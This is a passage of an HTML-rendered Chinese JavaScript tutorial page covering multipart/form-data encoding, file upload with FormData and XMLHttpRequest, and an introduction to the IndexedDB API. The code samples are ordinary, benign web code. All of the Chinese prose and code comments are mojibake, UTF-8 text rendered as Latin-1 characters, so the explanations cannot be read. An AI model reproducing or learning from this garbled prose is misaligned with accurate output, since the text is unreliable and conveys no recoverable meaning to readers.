</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p><strong>ï¼ˆ4ï¼‰multipart/form-data</strong></p> <p>å¦‚æœè¡¨å•ä½¿ç”¨<code>POST</code>æ–¹æ³•ï¼Œ<code>enctype</code>å±æ€§ä¸º<code>multipart/form-data</code>ï¼Œé‚£ä¹ˆæ•°æ®å°†ä»¥æ··åˆçš„æ ¼å¼å‘é€ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span>
  <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>register.php<span class="token punctuation">&quot;</span></span>
  <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>post<span class="token punctuation">&quot;</span></span>
  <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>multipart/form-data<span class="token punctuation">&quot;</span></span>
  <span class="token attr-name">onsubmit</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>AJAXSubmit(this); return false;<span class="token punctuation">&quot;</span></span>
<span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>å‘é€çš„ HTTP è¯·æ±‚å¦‚ä¸‹ã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header-name keyword">Content-Type:</span> multipart/form-data; boundary=---------------------------314911788813839

-----------------------------314911788813839
<span class="token header-name keyword">Content-Disposition:</span> form-data; name=&quot;foo&quot;

bar
-----------------------------314911788813839
<span class="token header-name keyword">Content-Disposition:</span> form-data; name=&quot;baz&quot;

The first line.
The second line.

-----------------------------314911788813839--

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><p>è¿™ç§æ ¼å¼ä¹Ÿæ˜¯æ–‡ä»¶ä¸Šä¼ çš„æ ¼å¼ã€‚</p> <h2 id="_5-æ–‡ä»¶ä¸Šä¼ "><a href="#_5-æ–‡ä»¶ä¸Šä¼ " class="header-anchor">#</a> 5.æ–‡ä»¶ä¸Šä¼ </h2> <p>ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶ï¼Œä¹Ÿæ˜¯é€šè¿‡è¡¨å•ã€‚å…·ä½“æ¥è¯´ï¼Œå°±æ˜¯é€šè¿‡æ–‡ä»¶è¾“å…¥æ¡†é€‰æ‹©æœ¬åœ°æ–‡ä»¶ï¼Œæäº¤è¡¨å•çš„æ—¶å€™ï¼Œæµè§ˆå™¨å°±ä¼šæŠŠè¿™ä¸ªæ–‡ä»¶å‘é€åˆ°æœåŠ¡å™¨ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>file<span class="token punctuation">&quot;</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>file<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>myFile<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>æ­¤å¤–ï¼Œè¿˜éœ€è¦å°†è¡¨å•<code>&lt;form&gt;</code>å…ƒç´ çš„<code>method</code>å±æ€§è®¾ä¸º<code>POST</code>ï¼Œ<code>enctype</code>å±æ€§è®¾ä¸º<code>multipart/form-data</code>ã€‚å…¶ä¸­ï¼Œ<code>enctype</code>å±æ€§å†³å®šäº† HTTP å¤´ä¿¡æ¯çš„<code>Content-Type</code>å­—æ®µçš„å€¼ï¼Œé»˜è®¤æƒ…å†µä¸‹è¿™ä¸ªå­—æ®µçš„å€¼æ˜¯<code>application/x-www-form-urlencoded</code>ï¼Œä½†æ˜¯æ–‡ä»¶ä¸Šä¼ çš„æ—¶å€™è¦æ”¹æˆ<code>multipart/form-data</code>ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>post<span class="token punctuation">&quot;</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>multipart/form-data<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>file<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>é€‰æ‹©ä¸€ä¸ªæ–‡ä»¶<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>file<span class="token punctuation">&quot;</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>file<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>myFile<span class="token punctuation">&quot;</span></span> <span class="token attr-name">multiple</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>submit_button<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>ä¸Šä¼ <span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>ä¸Šé¢çš„ HTML ä»£ç ä¸­ï¼Œfile æ§ä»¶çš„<code>multiple</code>å±æ€§ï¼ŒæŒ‡å®šå¯ä»¥ä¸€æ¬¡é€‰æ‹©å¤šä¸ªæ–‡ä»¶ï¼›å¦‚æœæ²¡æœ‰è¿™ä¸ªå±æ€§ï¼Œåˆ™ä¸€æ¬¡åªèƒ½é€‰æ‹©ä¸€ä¸ªæ–‡ä»¶ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> fileSelect <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> files <span class="token operator">=</span> fileSelect<span class="token punctuation">.</span>files<span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>ç„¶åï¼Œæ–°å»ºä¸€ä¸ª FormData å®ä¾‹å¯¹è±¡ï¼Œæ¨¡æ‹Ÿå‘é€åˆ°æœåŠ¡å™¨çš„è¡¨å•æ•°æ®ï¼ŒæŠŠé€‰ä¸­çš„æ–‡ä»¶æ·»åŠ åˆ°è¿™ä¸ªå¯¹è±¡ä¸Šé¢ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> files<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> file <span class="token operator">=</span> files<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token comment">// åªä¸Šä¼ å›¾ç‰‡æ–‡ä»¶</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>file<span class="token punctuation">.</span>type<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token string">'image.*'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">continue</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'photos[]'</span><span class="token punctuation">,</span> file<span class="token punctuation">,</span> file<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>æœ€åï¼Œä½¿ç”¨ Ajax å‘æœåŠ¡å™¨ä¸Šä¼ æ–‡ä»¶ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'handler.php'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

xhr<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>status <span class="token operator">!==</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'An error occurred!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>formData<span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>é™¤äº†å‘é€ FormData å®ä¾‹ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ AJAX å‘é€æ–‡ä»¶ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> file <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'test-input'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'myserver/uploads'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> file<span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h2 id="åäºŒã€indexeddb-api"><a href="#åäºŒã€indexeddb-api" class="header-anchor">#</a> åäºŒã€IndexedDB API</h2> <h2 id="_1-æ¦‚è¿°-5"><a href="#_1-æ¦‚è¿°-5" class="header-anchor">#</a> 1.æ¦‚è¿°</h2> <p>éšç€æµè§ˆå™¨çš„åŠŸèƒ½ä¸æ–­å¢å¼ºï¼Œè¶Šæ¥è¶Šå¤šçš„ç½‘ç«™å¼€å§‹è€ƒè™‘ï¼Œå°†å¤§é‡æ•°æ®å‚¨å­˜åœ¨å®¢æˆ·ç«¯ï¼Œè¿™æ ·å¯ä»¥å‡å°‘ä»æœåŠ¡å™¨è·å–æ•°æ®ï¼Œç›´æ¥ä»æœ¬åœ°è·å–æ•°æ®ã€‚</p> <p>ç°æœ‰çš„æµè§ˆå™¨æ•°æ®å‚¨å­˜æ–¹æ¡ˆï¼Œéƒ½ä¸é€‚åˆå‚¨å­˜å¤§é‡æ•°æ®ï¼šCookie çš„å¤§å°ä¸è¶…è¿‡ 4KBï¼Œä¸”æ¯æ¬¡è¯·æ±‚éƒ½ä¼šå‘é€å›æœåŠ¡å™¨ï¼›LocalStorage åœ¨ 2.5MB åˆ° 10MB ä¹‹é—´ï¼ˆå„å®¶æµè§ˆå™¨ä¸åŒï¼‰ï¼Œè€Œä¸”ä¸æä¾›æœç´¢åŠŸèƒ½ï¼Œä¸èƒ½å»ºç«‹è‡ªå®šä¹‰çš„ç´¢å¼•ã€‚æ‰€ä»¥ï¼Œéœ€è¦ä¸€ç§æ–°çš„è§£å†³æ–¹æ¡ˆï¼Œè¿™å°±æ˜¯ IndexedDB è¯ç”Ÿçš„èƒŒæ™¯ã€‚</p> <p>é€šä¿—åœ°è¯´ï¼ŒIndexedDB å°±æ˜¯æµè§ˆå™¨æä¾›çš„æœ¬åœ°æ•°æ®åº“ï¼Œå®ƒå¯ä»¥è¢«ç½‘é¡µè„šæœ¬åˆ›å»ºå’Œæ“ä½œã€‚IndexedDB å…è®¸å‚¨å­˜å¤§é‡æ•°æ®ï¼Œæä¾›æŸ¥æ‰¾æ¥å£ï¼Œè¿˜èƒ½å»ºç«‹ç´¢å¼•ã€‚è¿™äº›éƒ½æ˜¯ LocalStorage æ‰€ä¸å…·å¤‡çš„ã€‚å°±æ•°æ®åº“ç±»å‹è€Œè¨€ï¼ŒIndexedDB ä¸å±äºå…³ç³»å‹æ•°æ®åº“ï¼ˆä¸æ”¯æŒ SQL æŸ¥è¯¢è¯­å¥ï¼‰ï¼Œæ›´æ¥è¿‘ NoSQL æ•°æ®åº“ã€‚</p> <p>IndexedDB å…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ã€‚</p> <p><strong>ï¼ˆ1ï¼‰é”®å€¼å¯¹å‚¨å­˜ã€‚</strong> IndexedDB å†…éƒ¨é‡‡ç”¨å¯¹è±¡ä»“åº“ï¼ˆobject storeï¼‰å­˜æ”¾æ•°æ®ã€‚æ‰€æœ‰ç±»å‹çš„æ•°æ®éƒ½å¯ä»¥ç›´æ¥å­˜å…¥ï¼ŒåŒ…æ‹¬ JavaScript å¯¹è±¡ã€‚å¯¹è±¡ä»“åº“ä¸­ï¼Œæ•°æ®ä»¥â€œé”®å€¼å¯¹â€çš„å½¢å¼ä¿å­˜ï¼Œæ¯ä¸€ä¸ªæ•°æ®è®°å½•éƒ½æœ‰å¯¹åº”çš„ä¸»é”®ï¼Œä¸»é”®æ˜¯ç‹¬ä¸€æ— äºŒçš„ï¼Œä¸èƒ½æœ‰é‡å¤ï¼Œå¦åˆ™ä¼šæŠ›å‡ºä¸€ä¸ªé”™è¯¯ã€‚</p> <p><strong>ï¼ˆ2ï¼‰å¼‚æ­¥ã€‚</strong>  IndexedDB æ“ä½œæ—¶ä¸ä¼šé”æ­»æµè§ˆå™¨ï¼Œç”¨æˆ·ä¾ç„¶å¯ä»¥è¿›è¡Œå…¶ä»–æ“ä½œï¼Œè¿™ä¸ LocalStorage å½¢æˆå¯¹æ¯”ï¼Œåè€…çš„æ“ä½œæ˜¯åŒæ­¥çš„ã€‚å¼‚æ­¥è®¾è®¡æ˜¯ä¸ºäº†é˜²æ­¢å¤§é‡æ•°æ®çš„è¯»å†™ï¼Œæ‹–æ…¢ç½‘é¡µçš„è¡¨ç°ã€‚</p> <p><strong>ï¼ˆ3ï¼‰æ”¯æŒäº‹åŠ¡ã€‚</strong> IndexedDB æ”¯æŒäº‹åŠ¡ï¼ˆtransactionï¼‰ï¼Œè¿™æ„å‘³ç€ä¸€ç³»åˆ—æ“ä½œæ­¥éª¤ä¹‹ä¸­ï¼Œåªè¦æœ‰ä¸€æ­¥å¤±è´¥ï¼Œæ•´ä¸ªäº‹åŠ¡å°±éƒ½å–æ¶ˆï¼Œæ•°æ®åº“å›æ»šåˆ°äº‹åŠ¡å‘ç”Ÿä¹‹å‰çš„çŠ¶æ€ï¼Œä¸å­˜åœ¨åªæ”¹å†™ä¸€éƒ¨åˆ†æ•°æ®çš„æƒ…å†µã€‚</p> <p><strong>ï¼ˆ4ï¼‰åŒæºé™åˆ¶ã€‚</strong> IndexedDB å—åˆ°åŒæºé™åˆ¶ï¼Œæ¯ä¸€ä¸ªæ•°æ®åº“å¯¹åº”åˆ›å»ºå®ƒçš„åŸŸåã€‚ç½‘é¡µåªèƒ½è®¿é—®è‡ªèº«åŸŸåä¸‹çš„æ•°æ®åº“ï¼Œè€Œä¸èƒ½è®¿é—®è·¨åŸŸçš„æ•°æ®åº“ã€‚</p> <p><strong>ï¼ˆ5ï¼‰å‚¨å­˜ç©ºé—´å¤§ã€‚</strong> IndexedDB çš„å‚¨å­˜ç©ºé—´æ¯” LocalStorage å¤§å¾—å¤šï¼Œä¸€èˆ¬æ¥è¯´ä¸å°‘äº 250MBï¼Œç”šè‡³æ²¡æœ‰ä¸Šé™ã€‚</p> <p><strong>ï¼ˆ6ï¼‰æ”¯æŒäºŒè¿›åˆ¶å‚¨å­˜ã€‚</strong> IndexedDB ä¸ä»…å¯ä»¥å‚¨å­˜å­—ç¬¦ä¸²ï¼Œè¿˜å¯ä»¥å‚¨å­˜äºŒè¿›åˆ¶æ•°æ®ï¼ˆArrayBuffer å¯¹è±¡å’Œ Blob å¯¹è±¡ï¼‰ã€‚</p> <h2 id="_2-åŸºæœ¬æ¦‚å¿µ"><a href="#_2-åŸºæœ¬æ¦‚å¿µ" class="header-anchor">#</a> 2.åŸºæœ¬æ¦‚å¿µ</h2> <p>IndexedDB æ˜¯ä¸€ä¸ªæ¯”è¾ƒå¤æ‚çš„ APIï¼Œæ¶‰åŠä¸å°‘æ¦‚å¿µã€‚å®ƒæŠŠä¸åŒçš„å®ä½“ï¼ŒæŠ½è±¡æˆä¸€ä¸ªä¸ªå¯¹è±¡æ¥å£ã€‚å­¦ä¹ è¿™ä¸ª APIï¼Œå°±æ˜¯å­¦ä¹ å®ƒçš„å„ç§å¯¹è±¡æ¥å£ã€‚</p> <ul><li>æ•°æ®åº“ï¼šIDBDatabase å¯¹è±¡</li> <li>å¯¹è±¡ä»“åº“ï¼šIDBObjectStore å¯¹è±¡</li> <li>ç´¢å¼•ï¼š IDBIndex å¯¹è±¡</li> <li>äº‹åŠ¡ï¼š IDBTransaction å¯¹è±¡</li> <li>æ“ä½œè¯·æ±‚ï¼šIDBRequest å¯¹è±¡</li> <li>æŒ‡é’ˆï¼š IDBCursor å¯¹è±¡</li> <li>ä¸»é”®é›†åˆï¼šIDBKeyRange å¯¹è±¡</li></ul> <p>ä¸‹é¢æ˜¯ä¸€äº›ä¸»è¦çš„æ¦‚å¿µã€‚</p> <p><strong>ï¼ˆ1ï¼‰æ•°æ®åº“</strong></p> <p>æ•°æ®åº“æ˜¯ä¸€ç³»åˆ—ç›¸å…³æ•°æ®çš„å®¹å™¨ã€‚æ¯ä¸ªåŸŸåï¼ˆä¸¥æ ¼çš„è¯´ï¼Œæ˜¯åè®® + åŸŸå + ç«¯å£ï¼‰éƒ½å¯ä»¥æ–°å»ºä»»æ„å¤šä¸ªæ•°æ®åº“ã€‚</p> <p>IndexedDB æ•°æ®åº“æœ‰ç‰ˆæœ¬çš„æ¦‚å¿µã€‚åŒä¸€ä¸ªæ—¶åˆ»ï¼Œåªèƒ½æœ‰ä¸€ä¸ªç‰ˆæœ¬çš„æ•°æ®åº“å­˜åœ¨ã€‚å¦‚æœè¦ä¿®æ”¹æ•°æ®åº“ç»“æ„ï¼ˆæ–°å¢æˆ–åˆ é™¤è¡¨ã€ç´¢å¼•æˆ–è€…ä¸»é”®ï¼‰ï¼Œåªèƒ½é€šè¿‡å‡çº§æ•°æ®åº“ç‰ˆæœ¬å®Œæˆã€‚</p> <p><strong>ï¼ˆ2ï¼‰å¯¹è±¡ä»“åº“</strong></p> <p>æ¯ä¸ªæ•°æ®åº“åŒ…å«è‹¥å¹²ä¸ªå¯¹è±¡ä»“åº“ï¼ˆobject storeï¼‰ã€‚å®ƒç±»ä¼¼äºå…³ç³»å‹æ•°æ®åº“çš„è¡¨æ ¼ã€‚</p> <p><strong>ï¼ˆ3ï¼‰æ•°æ®è®°å½•</strong></p> <p>å¯¹è±¡ä»“åº“ä¿å­˜çš„æ˜¯æ•°æ®è®°å½•ã€‚æ¯æ¡è®°å½•ç±»ä¼¼äºå…³ç³»å‹æ•°æ®åº“çš„è¡Œï¼Œä½†æ˜¯åªæœ‰ä¸»é”®å’Œæ•°æ®ä½“ä¸¤éƒ¨åˆ†ã€‚ä¸»é”®ç”¨æ¥å»ºç«‹é»˜è®¤çš„ç´¢å¼•ï¼Œå¿…é¡»æ˜¯ä¸åŒçš„ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚ä¸»é”®å¯ä»¥æ˜¯æ•°æ®è®°å½•é‡Œé¢çš„ä¸€ä¸ªå±æ€§ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šä¸ºä¸€ä¸ªé€’å¢çš„æ•´æ•°ç¼–å·ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token punctuation">{</span> id<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> text<span class="token operator">:</span> <span class="token string">'foo'</span> <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>ä¸Šé¢çš„å¯¹è±¡ä¸­ï¼Œ<code>id</code>å±æ€§å¯ä»¥å½“ä½œä¸»é”®ã€‚</p> <p>æ•°æ®ä½“å¯ä»¥æ˜¯ä»»æ„æ•°æ®ç±»å‹ï¼Œä¸é™äºå¯¹è±¡ã€‚</p> <p><strong>ï¼ˆ4ï¼‰ç´¢å¼•</strong></p> <p>ä¸ºäº†åŠ é€Ÿæ•°æ®çš„æ£€ç´¢ï¼Œå¯ä»¥åœ¨å¯¹è±¡ä»“åº“é‡Œé¢ï¼Œä¸ºä¸åŒçš„å±æ€§å»ºç«‹ç´¢å¼•ã€‚</p> <p><strong>ï¼ˆ5ï¼‰äº‹åŠ¡</strong></p> <p>æ•°æ®è®°å½•çš„è¯»å†™å’Œåˆ æ”¹ï¼Œéƒ½è¦é€šè¿‡äº‹åŠ¡å®Œæˆã€‚äº‹åŠ¡å¯¹è±¡æä¾›<code>error</code>ã€<code>abort</code>å’Œ<code>complete</code>ä¸‰ä¸ªäº‹ä»¶ï¼Œç”¨æ¥ç›‘å¬æ“ä½œç»“æœã€‚</p> <h2 id="_3-æ“ä½œæµç¨‹"><a href="#_3-æ“ä½œæµç¨‹" class="header-anchor">#</a> 3.æ“ä½œæµç¨‹</h2> <p>IndexedDB æ•°æ®åº“çš„å„ç§æ“ä½œï¼Œä¸€èˆ¬æ˜¯æŒ‰ç…§ä¸‹é¢çš„æµç¨‹è¿›è¡Œçš„ã€‚è¿™ä¸ªéƒ¨åˆ†åªç»™å‡ºç®€å•çš„ä»£ç ç¤ºä¾‹ï¼Œç”¨äºå¿«é€Ÿä¸Šæ‰‹ï¼Œè¯¦ç»†çš„å„ä¸ªå¯¹è±¡çš„ API æ”¾åœ¨åæ–‡ä»‹ç»ã€‚</p> <h3 id="æ‰“å¼€æ•°æ®åº“"><a href="#æ‰“å¼€æ•°æ®åº“" class="header-anchor">#</a> æ‰“å¼€æ•°æ®åº“</h3> <p>ä½¿ç”¨ IndexedDB çš„ç¬¬ä¸€æ­¥æ˜¯æ‰“å¼€æ•°æ®åº“ï¼Œä½¿ç”¨<code>indexedDB.open()</code>æ–¹æ³•ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> request <span class="token operator">=</span> window<span class="token punctuation">.</span>indexedDB<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>databaseName<span class="token punctuation">,</span> version<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>è¿™ä¸ªæ–¹æ³•æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæ•°æ®åº“çš„åå­—ã€‚å¦‚æœæŒ‡å®šçš„æ•°æ®åº“ä¸å­˜åœ¨ï¼Œå°±ä¼šæ–°å»ºæ•°æ®åº“ã€‚ç¬¬äºŒä¸ªå‚æ•°æ˜¯æ•´æ•°ï¼Œè¡¨ç¤ºæ•°æ®åº“çš„ç‰ˆæœ¬ã€‚å¦‚æœçœç•¥ï¼Œæ‰“å¼€å·²æœ‰æ•°æ®åº“æ—¶ï¼Œé»˜è®¤ä¸ºå½“å‰ç‰ˆæœ¬ï¼›æ–°å»ºæ•°æ®åº“æ—¶ï¼Œé»˜è®¤ä¸º<code>1</code>ã€‚</p> <p><code>indexedDB.open()</code>æ–¹æ³•è¿”å›ä¸€ä¸ª IDBRequest å¯¹è±¡ã€‚è¿™ä¸ªå¯¹è±¡é€šè¿‡ä¸‰ç§äº‹ä»¶<code>error</code>ã€<code>success</code>ã€<code>upgradeneeded</code>ï¼Œå¤„ç†æ‰“å¼€æ•°æ®åº“çš„æ“ä½œç»“æœã€‚</p> <p><strong>ï¼ˆ1ï¼‰error äº‹ä»¶</strong></p> <p><code>error</code>äº‹ä»¶è¡¨ç¤ºæ‰“å¼€æ•°æ®åº“å¤±è´¥ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>request<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'æ•°æ®åº“æ‰“å¼€æŠ¥é”™'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
